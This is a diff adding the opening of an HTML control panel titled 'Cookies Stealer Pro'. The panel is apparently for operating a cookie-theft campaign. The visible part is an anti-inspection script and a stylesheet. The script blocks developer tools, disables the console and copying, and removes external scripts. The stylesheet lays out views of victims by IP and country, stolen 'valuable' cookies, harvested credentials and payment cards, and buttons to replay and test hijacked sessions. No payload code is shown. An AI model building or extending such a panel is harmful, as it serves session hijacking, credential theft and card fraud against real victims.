@@ -1,0 +1,2791 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cipher Anon — Cookies Stealer Pro</title>
+
+    <script>
+        (function() {
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12') { e.preventDefault(); e.stopPropagation(); return false; }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
+                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+                if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) { e.preventDefault(); return false; }
+                if (e.metaKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+                if (e.metaKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
+                if (e.metaKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
+            }, true);
+
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+
+            document.onselectstart = function() { return false; };
+            document.oncopy = function() { return false; };
+            document.oncut = function() { return false; };
+            document.onpaste = function() { return false; };
+
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.debug = function() {};
+            console.info = function() {};
+            console.table = function() {};
+            console.trace = function() {};
+            console.group = function() {};
+            console.groupEnd = function() {};
+            console.dir = function() {};
+            console.dirxml = function() {};
+            console.clear();
+
+            function blockDevtools() {
+                try {
+                    const start = performance.now();
+                    debugger;
+                    const end = performance.now();
+                    if (end - start > 100) {
+                        document.body.innerHTML = '<div style="background:#0a0a0a;color:#ff4444;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:24px;">🔒 Access Denied</div>';
+                        window.location.reload();
+                    }
+                } catch {}
+            }
+            setInterval(blockDevtools, 1000);
+
+            document.addEventListener('DOMContentLoaded', function() {
+                document.querySelectorAll('script').forEach(el => {
+                    if (el.src && !el.src.includes('blob:')) {
+                        el.removeAttribute('src');
+                    }
+                });
+            });
+        })();
+    </script>
+
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #0b0f1a; }
+        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #2a3a5a; }
+
+        body {
+            background: #0b0f1a;
+            color: #c8d0dc;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .sidebar {
+            width: 240px;
+            background: linear-gradient(180deg, #0f1626 0%, #111827 100%);
+            min-height: 100vh;
+            padding: 20px 14px;
+            border-right: 1px solid #1a2538;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+            overflow-y: auto;
+            transition: transform 0.3s ease;
+            z-index: 100;
+        }
+        .sidebar .logo { padding: 0 6px 18px 6px; border-bottom: 1px solid #1a2538; margin-bottom: 18px; }
+        .sidebar .logo .brand { font-size: 16px; font-weight: 800; color: #00ff88; display: flex; align-items: center; gap: 8px; }
+        .sidebar .logo .brand .icon { font-size: 20px; }
+        .sidebar .logo .brand .highlight { color: #ff4444; }
+        .sidebar .logo .sub { font-size: 9px; color: #475569; letter-spacing: 1.5px; text-transform: uppercase; margin-top: 2px; padding-left: 4px; }
+        .sidebar .logo .sub span { color: #00ff88; }
+
+        .sidebar .nav-item {
+            padding: 8px 12px;
+            border-radius: 8px;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 1px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+        .sidebar .nav-item:hover { background: #1a2538; color: #e2e8f0; transform: translateX(4px); }
+        .sidebar .nav-item.active { background: linear-gradient(135deg, #1a2538, #0f1626); color: #00ff88; border-left: 3px solid #00ff88; }
+        .sidebar .nav-item .icon { font-size: 16px; width: 22px; text-align: center; }
+        .sidebar .nav-divider { border-top: 1px solid #1a2538; margin: 12px 6px; }
+        .sidebar .nav-label { font-size: 9px; color: #334155; text-transform: uppercase; letter-spacing: 1px; padding: 6px 12px; }
+        .sidebar .version { font-size: 9px; color: #1e293b; text-align: center; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
+        .sidebar .version span { color: #00ff88; }
+
+        .sidebar .nav-item.trash-nav { color: #f59e0b; }
+        .sidebar .nav-item.trash-nav:hover { color: #ffaa44; background: #1a1400; }
+        .sidebar .nav-item.trash-nav.active { color: #f59e0b; border-left-color: #f59e0b; }
+        .sidebar .nav-item.trash-nav .badge {
+            margin-left: auto;
+            background: #f59e0b;
+            color: #0b0f1a;
+            font-size: 9px;
+            padding: 0 6px;
+            border-radius: 8px;
+            font-weight: 700;
+            min-width: 18px;
+            text-align: center;
+        }
+
+        /* NEW: creds & cards nav with colored badges */
+        .sidebar .nav-item.creds-nav { color: #ec4899; }
+        .sidebar .nav-item.creds-nav:hover { color: #f472b6; background: #1a0a1a; }
+        .sidebar .nav-item.creds-nav.active { color: #ec4899; border-left-color: #ec4899; }
+        .sidebar .nav-item.creds-nav .badge {
+            margin-left: auto;
+            background: #ec4899;
+            color: #0b0f1a;
+            font-size: 9px;
+            padding: 0 6px;
+            border-radius: 8px;
+            font-weight: 700;
+            min-width: 18px;
+            text-align: center;
+        }
+
+        .sidebar .nav-item.cards-nav { color: #06b6d4; }
+        .sidebar .nav-item.cards-nav:hover { color: #22d3ee; background: #0a1a1a; }
+        .sidebar .nav-item.cards-nav.active { color: #06b6d4; border-left-color: #06b6d4; }
+        .sidebar .nav-item.cards-nav .badge {
+            margin-left: auto;
+            background: #06b6d4;
+            color: #0b0f1a;
+            font-size: 9px;
+            padding: 0 6px;
+            border-radius: 8px;
+            font-weight: 700;
+            min-width: 18px;
+            text-align: center;
+        }
+
+        .sidebar-toggle {
+            display: none;
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            z-index: 200;
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            color: #94a3b8;
+            padding: 6px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: 0.2s;
+        }
+        .sidebar-toggle:hover { border-color: #2a3a5a; color: #e2e8f0; }
+
+        .sidebar-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            z-index: 50;
+        }
+
+        .main {
+            flex: 1;
+            padding: 20px 24px 24px;
+            min-height: 100vh;
+            background: radial-gradient(ellipse at 50% 0%, #111827 0%, #0b0f1a 100%);
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+
+        .topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #1a2538;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .topbar .page-title h2 { font-size: 20px; font-weight: 700; color: #f1f5f9; background: linear-gradient(135deg, #f1f5f9 60%, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .topbar .page-title p { font-size: 12px; color: #475569; margin-top: 2px; }
+        .topbar .page-title p .accent { color: #00ff88; }
+
+        .topbar .right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .topbar .right .live-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #64748b;
+            background: #0f1626;
+            padding: 4px 12px;
+            border-radius: 16px;
+            border: 1px solid #1a2538;
+        }
+        .topbar .right .live-badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: pulse-dot 1.5s infinite;
+            box-shadow: 0 0 8px rgba(0,255,136,0.3);
+        }
+        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
+
+        .topbar .right .user {
+            background: #0f1626;
+            padding: 4px 12px 4px 8px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #e2e8f0;
+            border: 1px solid #1a2538;
+        }
+        .topbar .right .user .avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00ff88, #00cc77);
+            color: #0b0f1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 11px;
+        }
+        .topbar .right .settings-btn {
+            background: transparent;
+            border: 1px solid #1a2538;
+            color: #64748b;
+            padding: 4px 12px;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .topbar .right .settings-btn:hover { border-color: #2a3a5a; color: #e2e8f0; }
+        .topbar .right .logout-btn {
+            background: transparent;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            padding: 4px 12px;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .topbar .right .logout-btn:hover { background: rgba(255,68,68,0.1); border-color: #ff6666; color: #ff6666; }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            border-radius: 10px;
+            padding: 12px 14px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .stat-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
+        .stat-card:hover::before { opacity: 1; }
+
+        .stat-card .label { font-size: 9px; color: #475569; text-transform: uppercase; letter-spacing: 0.6px; font-weight: 600; }
+        .stat-card .number { font-size: 24px; font-weight: 700; color: #f1f5f9; margin-top: 2px; font-family: 'Inter', sans-serif; }
+        .stat-card .number.green { color: #00ff88; }
+        .stat-card .number.orange { color: #f59e0b; }
+        .stat-card .number.purple { color: #8b5cf6; }
+        .stat-card .number.blue { color: #3b82f6; }
+        .stat-card .number.pink { color: #ec4899; }
+        .stat-card .number.cyan { color: #06b6d4; }
+        .stat-card .sub { font-size: 10px; color: #334155; margin-top: 2px; }
+
+        .toolbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        .toolbar .left { display: flex; gap: 6px; flex-wrap: wrap; }
+        .toolbar .right { display: flex; gap: 6px; flex-wrap: wrap; }
+
+        .btn {
+            padding: 6px 12px;
+            border-radius: 8px;
+            border: 1px solid #1a2538;
+            background: #0f1626;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 11px;
+            transition: all 0.25s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+        .btn:hover { border-color: #2a3a5a; background: #1a2538; color: #e2e8f0; transform: translateY(-1px); }
+        .btn.primary { border-color: #00ff88; color: #00ff88; }
+        .btn.primary:hover { background: rgba(0,255,136,0.08); box-shadow: 0 0 20px rgba(0,255,136,0.1); }
+        .btn.danger { border-color: #ff4444; color: #ff4444; }
+        .btn.danger:hover { background: rgba(255,68,68,0.08); box-shadow: 0 0 20px rgba(255,68,68,0.1); }
+        .btn.warning { border-color: #f59e0b; color: #f59e0b; }
+        .btn.warning:hover { background: rgba(245,158,11,0.08); box-shadow: 0 0 20px rgba(245,158,11,0.1); }
+
+        .domain-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 12px;
+        }
+        .domain-card {
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            border-radius: 10px;
+            padding: 14px 16px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        .domain-card:hover { border-color: #2a3a5a; transform: translateY(-3px); box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
+        .domain-card .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 6px;
+        }
+        .domain-card .header .domain { font-size: 14px; font-weight: 600; color: #f1f5f9; word-break: break-all; }
+        .domain-card .header .badge-valuable {
+            font-size: 7px;
+            background: linear-gradient(135deg, #ff4444, #cc3333);
+            color: #fff;
+            padding: 1px 8px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            font-weight: 700;
+            box-shadow: 0 0 12px rgba(255,68,68,0.15);
+            white-space: nowrap;
+        }
+        .domain-card .header .badge-cred {
+            font-size: 7px;
+            background: linear-gradient(135deg, #ec4899, #db2777);
+            color: #fff;
+            padding: 1px 8px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            font-weight: 700;
+            box-shadow: 0 0 12px rgba(236,72,153,0.15);
+            white-space: nowrap;
+        }
+        .domain-card .header .badge-card {
+            font-size: 7px;
+            background: linear-gradient(135deg, #06b6d4, #0891b2);
+            color: #fff;
+            padding: 1px 8px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            font-weight: 700;
+            box-shadow: 0 0 12px rgba(6,182,212,0.15);
+            white-space: nowrap;
+        }
+        .domain-card .stats {
+            display: flex;
+            gap: 12px;
+            margin: 6px 0 4px;
+            font-size: 11px;
+            color: #64748b;
+            flex-wrap: wrap;
+        }
+        .domain-card .stats strong { color: #e2e8f0; }
+        .domain-card .stats .cookies { color: #00ff88; }
+        .domain-card .stats .victims { color: #f59e0b; }
+        .domain-card .stats .creds { color: #ec4899; }
+        .domain-card .stats .cards { color: #06b6d4; }
+
+        .domain-card .victims-list {
+            margin-top: 4px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 3px;
+        }
+        .domain-card .victims-list .victim-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 2px;
+            background: #1a2538;
+            padding: 1px 6px 1px 3px;
+            border-radius: 8px;
+            font-size: 8px;
+            color: #94a3b8;
+            border: 1px solid #1e293b;
+            transition: 0.2s;
+        }
+        .domain-card .victims-list .victim-tag:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1e2a3e; }
+        .domain-card .victims-list .victim-tag .flag { font-size: 10px; }
+        .domain-card .victims-list .victim-tag .ip { font-family: monospace; font-size: 8px; }
+        .domain-card .victims-list .victim-tag .time { font-size: 7px; color: #475569; margin-left: 1px; }
+        .domain-card .victims-list .victim-tag .time .ago { color: #00ff88; }
+
+        .domain-card .meta {
+            font-size: 10px;
+            color: #334155;
+            border-top: 1px solid #1a2538;
+            padding-top: 6px;
+            margin-top: 6px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+        .domain-card .meta .latest-time { color: #64748b; }
+        .domain-card .meta .latest-time .time-text { color: #94a3b8; }
+
+        .domain-card .actions {
+            margin-top: 8px;
+            display: flex;
+            gap: 4px;
+            flex-wrap: wrap;
+        }
+        .domain-card .actions .btn-sm {
+            padding: 2px 8px;
+            font-size: 9px;
+            border-radius: 4px;
+            border: 1px solid #1a2538;
+            background: transparent;
+            color: #64748b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        .domain-card .actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
+        .domain-card .actions .btn-sm.replay { border-color: #00ff88; color: #00ff88; }
+        .domain-card .actions .btn-sm.replay:hover { background: rgba(0,255,136,0.08); }
+        .domain-card .actions .btn-sm.test { border-color: #3b82f6; color: #3b82f6; }
+        .domain-card .actions .btn-sm.test:hover { background: rgba(59,130,246,0.08); }
+        .domain-card .actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
+        .domain-card .actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
+
+        .view-content { display: none; }
+        .view-content.active { display: block; }
+
+        .cookies-table-wrap { overflow-x: auto; margin-top: 12px; }
+        .cookies-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 11px;
+            min-width: 500px;
+        }
+        .cookies-table th {
+            text-align: left;
+            padding: 8px 10px;
+            background: #1a2538;
+            color: #94a3b8;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 9px;
+            letter-spacing: 0.4px;
+            border-bottom: 2px solid #2a3a5a;
+            position: sticky;
+            top: 0;
+        }
+        .cookies-table td { padding: 6px 10px; border-bottom: 1px solid #1a2538; color: #c8d0dc; vertical-align: middle; }
+        .cookies-table tr:hover td { background: #1a2538; }
+        .cookies-table .cookie-domain { color: #00ff88; font-weight: 500; }
+        .cookies-table .cookie-name { color: #f59e0b; font-family: monospace; font-size: 10px; }
+        .cookies-table .cookie-value { color: #94a3b8; font-family: monospace; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .cookies-table .cookie-valuable { background: #ff4444; color: #fff; font-size: 6px; padding: 1px 6px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
+
+        .victims-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 10px;
+            margin-top: 12px;
+        }
+        .victim-card {
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            border-radius: 8px;
+            padding: 12px 14px;
+            transition: 0.2s;
+        }
+        .victim-card:hover { border-color: #2a3a5a; }
+        .victim-card .v-header { display: flex; align-items: center; gap: 6px; margin-bottom: 4px; }
+        .victim-card .v-header .flag { font-size: 18px; }
+        .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
+        .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 6px; }
+        .victim-card .v-details .domain { color: #00ff88; }
+        .victim-card .v-details .time { color: #475569; }
+        .victim-card .v-cookies { font-size: 9px; color: #f59e0b; margin-top: 2px; }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.88);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 1000;
+            padding: 15px;
+            overflow-y: auto;
+        }
+        .modal-overlay.active { display: block; }
+
+        .modal {
+            background: linear-gradient(145deg, #111827, #0f1626);
+            max-width: 820px;
+            margin: 0 auto;
+            border-radius: 14px;
+            padding: 20px 22px;
+            border: 1px solid #1a2538;
+            box-shadow: 0 20px 80px rgba(0,0,0,0.6);
+            animation: modalIn 0.3s ease;
+        }
+        @keyframes modalIn { 0% { opacity: 0; transform: scale(0.95) translateY(20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }
+
+        .modal .close {
+            float: right;
+            background: none;
+            border: none;
+            color: #475569;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 2px 6px;
+            border-radius: 6px;
+        }
+        .modal .close:hover { color: #e2e8f0; background: #1a2538; }
+        .modal h2 { color: #f1f5f9; margin-bottom: 14px; font-size: 17px; font-weight: 700; word-break: break-all; }
+
+        .modal .victim-entry {
+            background: #0b0f1a;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            border: 1px solid #1a2538;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        .modal .victim-entry:hover { border-color: #2a3a5a; }
+
+        .modal .victim-entry .victim-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+            flex-wrap: wrap;
+        }
+        .modal .victim-entry .victim-header .flag { font-size: 18px; }
+        .modal .victim-entry .victim-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
+        .modal .victim-entry .victim-header .country { font-size: 11px; color: #94a3b8; }
+        .modal .victim-entry .victim-header .city { font-size: 10px; color: #64748b; }
+        .modal .victim-entry .victim-header .time-badge {
+            margin-left: auto;
+            font-size: 9px;
+            color: #475569;
+            background: #1a2538;
+            padding: 2px 8px;
+            border-radius: 10px;
+            border: 1px solid #1e293b;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+        .modal .victim-entry .victim-header .time-badge .full-time { color: #94a3b8; }
+        .modal .victim-entry .victim-header .time-badge .ago { color: #00ff88; font-weight: 500; }
+
+        .modal .victim-entry .delete-btn {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: transparent;
+            border: none;
+            color: #475569;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 2px 6px;
+            border-radius: 4px;
+            line-height: 1;
+        }
+        .modal .victim-entry .delete-btn:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
+
+        .modal .victim-entry .cookies-section {
+            margin-top: 4px;
+            padding-top: 4px;
+            border-top: 1px solid #1a2538;
+        }
+        .modal .victim-entry .cookies-section .cookie-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 2px 0;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 9px;
+            border-bottom: 1px solid #0f1626;
+            gap: 4px;
+        }
+        .modal .victim-entry .cookies-section .cookie-item .name { color: #00ff88; word-break: break-word; }
+        .modal .victim-entry .cookies-section .cookie-item .value { color: #f59e0b; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
+        .modal .victim-entry .cookies-section .cookie-item .actions { display: flex; gap: 3px; flex-shrink: 0; }
+        .modal .victim-entry .cookies-section .cookie-item .actions .btn-icon {
+            background: transparent;
+            border: 1px solid #1a2538;
+            color: #64748b;
+            padding: 0 5px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 8px;
+            transition: 0.2s;
+        }
+        .modal .victim-entry .cookies-section .cookie-item .actions .btn-icon:hover { border-color: #2a3a5a; color: #e2e8f0; }
+        .modal .victim-entry .cookies-section .cookie-item .valuable-tag {
+            font-size: 5px;
+            background: linear-gradient(135deg, #ff4444, #cc3333);
+            color: #fff;
+            padding: 1px 4px;
+            border-radius: 6px;
+            text-transform: uppercase;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .modal .session-actions {
+            margin-top: 14px;
+            padding-top: 14px;
+            border-top: 1px solid #1a2538;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .modal .session-actions .btn { padding: 5px 14px; font-size: 12px; }
+
+        .test-result {
+            margin-top: 8px;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            display: none;
+            font-weight: 500;
+        }
+        .test-result.show { display: block; }
+        .test-result.valid { background: rgba(0,255,136,0.08); border: 1px solid #00ff88; color: #00ff88; }
+        .test-result.invalid { background: rgba(255,68,68,0.08); border: 1px solid #ff4444; color: #ff4444; }
+
+        .settings-modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.88);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 1100;
+            padding: 15px;
+            overflow-y: auto;
+        }
+        .settings-modal-overlay.active { display: block; }
+        .settings-modal {
+            background: linear-gradient(145deg, #111827, #0f1626);
+            max-width: 480px;
+            margin: 0 auto;
+            border-radius: 14px;
+            padding: 20px 22px;
+            border: 1px solid #1a2538;
+            box-shadow: 0 20px 80px rgba(0,0,0,0.6);
+            animation: modalIn 0.3s ease;
+        }
+        .settings-modal h2 { color: #f1f5f9; margin-bottom: 14px; font-size: 18px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+        .settings-modal .close { float: right; background: none; border: none; color: #475569; font-size: 20px; cursor: pointer; transition: 0.2s; padding: 2px 6px; border-radius: 6px; }
+        .settings-modal .close:hover { color: #e2e8f0; background: #1a2538; }
+        .settings-modal .form-group { margin-bottom: 10px; }
+        .settings-modal .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 2px; font-weight: 500; }
+        .settings-modal .form-group input { width: 100%; padding: 6px 10px; background: #0b0f1a; border: 1px solid #1a2538; border-radius: 6px; color: #e2e8f0; font-size: 12px; transition: 0.2s; font-family: inherit; }
+        .settings-modal .form-group input:focus { outline: none; border-color: #00ff88; }
+        .settings-modal .form-group input::placeholder { color: #334155; }
+        .settings-modal .form-group .error-text { font-size: 10px; color: #ff4444; margin-top: 2px; display: none; }
+        .settings-modal .form-group .error-text.show { display: block; }
+        .settings-modal .form-group .help-text { font-size: 9px; color: #475569; margin-top: 2px; }
+        .settings-modal .form-group .help-text a { color: #00ff88; }
+        .settings-modal .form-group label.checkbox-label { display: flex; align-items: center; gap: 6px; cursor: pointer; font-weight: 400; font-size: 11px; color: #94a3b8; }
+        .settings-modal .form-group label.checkbox-label input { width: 14px; height: 14px; accent-color: #00ff88; cursor: pointer; }
+        .settings-modal .btn-group { display: flex; gap: 8px; margin-top: 12px; }
+        .settings-modal .btn-group .btn { flex: 1; justify-content: center; }
+        .settings-modal .section-divider { border-top: 1px solid #1a2538; padding-top: 12px; margin-top: 12px; }
+        .settings-modal .section-title { color: #94a3b8; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
+        .settings-modal .info-text { font-size: 10px; color: #475569; margin-top: 12px; text-align: center; border-top: 1px solid #1a2538; padding-top: 12px; }
+        .settings-modal .info-text .key { color: #64748b; font-family: monospace; font-size: 9px; }
+
+        .logout-confirm-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 3000;
+            padding: 15px;
+            align-items: center;
+            justify-content: center;
+        }
+        .logout-confirm-overlay.active { display: flex; }
+        .logout-confirm-box {
+            background: linear-gradient(145deg, #111827, #0f1626);
+            max-width: 380px;
+            width: 100%;
+            border-radius: 16px;
+            padding: 28px 24px 24px;
+            border: 1px solid #1a2538;
+            box-shadow: 0 20px 80px rgba(0,0,0,0.7);
+            animation: modalIn 0.3s ease;
+            text-align: center;
+        }
+        .logout-confirm-box .icon { font-size: 40px; margin-bottom: 8px; }
+        .logout-confirm-box h3 { color: #f1f5f9; font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+        .logout-confirm-box p { color: #64748b; font-size: 13px; margin-bottom: 18px; line-height: 1.5; }
+        .logout-confirm-box .btn-group { display: flex; gap: 10px; }
+        .logout-confirm-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
+        .logout-confirm-box .btn-group .btn.cancel { border-color: #1a2538; color: #94a3b8; }
+        .logout-confirm-box .btn-group .btn.cancel:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
+        .logout-confirm-box .btn-group .btn.confirm { border-color: #ff4444; color: #ff4444; }
+        .logout-confirm-box .btn-group .btn.confirm:hover { background: rgba(255,68,68,0.15); box-shadow: 0 0 30px rgba(255,68,68,0.15); }
+
+        .custom-confirm-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            z-index: 3001;
+            padding: 15px;
+            align-items: center;
+            justify-content: center;
+        }
+        .custom-confirm-overlay.active { display: flex; }
+        .custom-confirm-box {
+            background: linear-gradient(145deg, #111827, #0f1626);
+            max-width: 380px;
+            width: 100%;
+            border-radius: 16px;
+            padding: 28px 24px 24px;
+            border: 1px solid #1a2538;
+            box-shadow: 0 20px 80px rgba(0,0,0,0.7);
+            animation: modalIn 0.3s ease;
+            text-align: center;
+        }
+        .custom-confirm-box .icon { font-size: 40px; margin-bottom: 8px; }
+        .custom-confirm-box h3 { color: #f1f5f9; font-size: 17px; font-weight: 700; margin-bottom: 4px; }
+        .custom-confirm-box p { color: #64748b; font-size: 13px; margin-bottom: 18px; line-height: 1.5; }
+        .custom-confirm-box .btn-group { display: flex; gap: 10px; }
+        .custom-confirm-box .btn-group .btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; border-radius: 8px; }
+        .custom-confirm-box .btn-group .btn.cancel { border-color: #1a2538; color: #94a3b8; }
+        .custom-confirm-box .btn-group .btn.cancel:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
+        .custom-confirm-box .btn-group .btn.confirm { border-color: #00ff88; color: #00ff88; }
+        .custom-confirm-box .btn-group .btn.confirm:hover { background: rgba(0,255,136,0.08); box-shadow: 0 0 30px rgba(0,255,136,0.15); }
+        .custom-confirm-box .btn-group .btn.danger-confirm { border-color: #ff4444; color: #ff4444; }
+        .custom-confirm-box .btn-group .btn.danger-confirm:hover { background: rgba(255,68,68,0.15); box-shadow: 0 0 30px rgba(255,68,68,0.15); }
+
+        .empty-state { text-align: center; padding: 30px 20px; color: #334155; grid-column: 1/-1; }
+        .empty-state .icon { font-size: 32px; margin-bottom: 8px; }
+        .empty-state h3 { color: #64748b; font-size: 15px; font-weight: 600; }
+        .empty-state p { font-size: 12px; margin-top: 2px; }
